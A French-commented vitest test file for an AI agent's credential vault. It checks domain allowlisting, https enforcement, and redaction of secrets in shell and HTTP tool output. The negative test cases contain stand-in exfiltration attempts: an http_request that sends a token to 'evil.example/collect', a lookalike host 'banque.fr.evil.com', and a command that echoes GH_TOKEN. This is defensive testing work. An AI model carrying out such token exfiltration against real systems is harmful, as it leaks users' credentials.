// Portage de packages/core/test/vault.test.ts (rév. 2e180305).
import { afterEach, describe, expect, it, vi } from "vitest";
import { executeGuardedTool } from "../src/agent.js";
import { hostAllowed, VaultService, vaultKey } from "@jarod/plugin-rag";
import { makeCore, tempDir } from "./helpers.js";

afterEach(() => vi.unstubAllGlobals());

async function coreWithVault() {
  const core = await makeCore();
  core.vault.save(
    { name: "gh_token", description: "Jeton GitHub", domains: ["api.github.com"], allowShell: true },
    "ghp_SUPERSECRET123",
  );
  core.vault.save(
    { name: "banque", description: "Mot de passe bancaire", domains: ["*.banque.fr"], allowShell: false },
    "motdepasse-bancaire",
  );
  return core;
}

// Le portail du garde unifié est TOUJOURS fourni en production (plugin-permissions) ; ces tests portent sur le
// coffre, pas sur les permissions : ils l'ouvrent explicitement — son ABSENCE vaut « deny » (AV2-008).
const allowGate = { decide: () => "allow" as const };

const run = (core: Awaited<ReturnType<typeof makeCore>>, name: string, args: Record<string, unknown>, workspace?: string) =>
  executeGuardedTool(
    core.tools,
    "s1",
    { id: "c1", name, args },
    new AbortController().signal,
    { approve: async () => true },
    { ...core.settings.getAll(), workspace: workspace ?? null, autoApproveTools: true },
    { vault: core.vault, gate: allowGate },
  );

describe("le coffre d'identifiants", () => {
  it("garde les valeurs dans les secrets chiffrés, jamais dans les réglages", async () => {
    const core = await coreWithVault();
    expect(core.vault.list().map((e) => [e.name, e.envVar])).toEqual([
      ["gh_token", "GH_TOKEN"],
      ["banque", "BANQUE"],
    ]);
    expect(JSON.stringify(core.settings.getAll())).not.toContain("SUPERSECRET");
    expect(core.settings.getSecret(vaultKey("gh_token"))).toBe("ghp_SUPERSECRET123");
    // Editing the description keeps the value.
    core.vault.save({
      name: "gh_token",
      description: "Jeton GitHub (lecture)",
      domains: ["api.github.com"],
      allowShell: true,
    });
    expect(core.vault.hasValue("gh_token")).toBe(true);
    expect(() => core.vault.save({ name: "1bad", description: "", domains: [], allowShell: false }, "x")).toThrow(
      /invalide/,
    );
    expect(() => core.vault.save({ name: "nouveau", description: "", domains: [], allowShell: false })).toThrow(
      /besoin d'une valeur/,
    );
    core.vault.remove("banque");
    expect(core.vault.get("banque")).toBeUndefined();
    expect(core.settings.getSecret(vaultKey("banque"))).toBeUndefined();
  });

  it("ne remplit une requête que vers un domaine permis, et en https", async () => {
    const core = await coreWithVault();
    expect(hostAllowed("api.github.com", ["api.github.com"])).toBe(true);
    expect(hostAllowed("www.banque.fr", ["*.banque.fr"])).toBe(true);
    expect(hostAllowed("banque.fr.evil.com", ["*.banque.fr"])).toBe(false);
    const ok = core.vault.fillRequest(new URL("https://api.github.com/user"), ["token {{secret:gh_token}}"]);
    expect(ok.parts).toEqual(["token ghp_SUPERSECRET123"]);
    expect(() => core.vault.fillRequest(new URL("https://evil.example/"), ["{{secret:gh_token}}"])).toThrow(
      /pas autorisé pour evil.example/,
    );
    expect(() => core.vault.fillRequest(new URL("http://api.github.com/"), ["{{secret:gh_token}}"])).toThrow(/https/);
    expect(() => core.vault.fillRequest(new URL("https://api.github.com/"), ["{{secret:inconnu}}"])).toThrow(/inconnu/);
  });

  it("masque la valeur et ses formes courantes dans ce qui revient", () => {
    const used = [{ name: "k", value: "a b/c+d" }];
    const echoed = `brut=a b/c+d url=${encodeURIComponent("a b/c+d")} b64=${Buffer.from("a b/c+d").toString("base64")}`;
    expect(VaultService.redact(echoed, used)).toBe("brut=[secret:k] url=[secret:k] b64=[secret:k]");
  });
});

describe("les outils voient les noms, jamais les valeurs", () => {
  it("vault_list décrit le coffre sans aucune valeur", async () => {
    const core = await coreWithVault();
    const r = await run(core, "vault_list", {});
    expect(r.content).toContain("gh_token : Jeton GitHub");
    expect(r.content).toContain("variable GH_TOKEN");
    expect(r.content).not.toContain("SUPERSECRET");
  });

  it("run_shell reçoit le secret en variable d'environnement, et sa sortie est expurgée", async () => {
    const core = await coreWithVault();
    const r = await run(
      core,
      "run_shell",
      { command: `node -e "console.log('jeton=' + process.env.GH_TOKEN)"`, secrets: ["gh_token"] },
      tempDir(),
    );
    expect(r.isError).toBe(false);
    expect(r.content).toContain("jeton=[secret:gh_token]");
    expect(r.content).not.toContain("SUPERSECRET");

    const refused = await run(core, "run_shell", { command: "echo x", secrets: ["banque"] }, tempDir());
    expect(refused.isError).toBe(true);
    expect(refused.content).toMatch(/pas autorisé dans les commandes shell/);
  });

  it("http_request pose le secret dans l'en-tête vers le bon domaine et masque l'écho", async () => {
    const core = await coreWithVault();
    const seen: { url: string; headers: Record<string, string> }[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (url: URL, init: RequestInit) => {
        seen.push({ url: String(url), headers: init.headers as Record<string, string> });
        return new Response(`{"echo":"${(init.headers as Record<string, string>).authorization}"}`, { status: 200 });
      }),
    );
    const r = await run(core, "http_request", {
      url: "https://api.github.com/user",
      headers: { authorization: "token {{secret:gh_token}}" },
    });
    expect(r.isError).toBe(false);
    expect(seen[0]!.headers.authorization).toBe("token ghp_SUPERSECRET123");
    expect(r.content).toContain('"echo":"token [secret:gh_token]"');
    expect(r.content).not.toContain("SUPERSECRET");

    const elsewhere = await run(core, "http_request", {
      url: "https://evil.example/collect",
      headers: { authorization: "{{secret:gh_token}}" },
    });
    expect(elsewhere.isError).toBe(true);
    const inUrl = await run(core, "http_request", { url: "https://api.github.com/?t={{secret:gh_token}}" });
    expect(inUrl.content).toMatch(/jamais dans l'URL/);
    expect(seen).toHaveLength(1);
  });
});
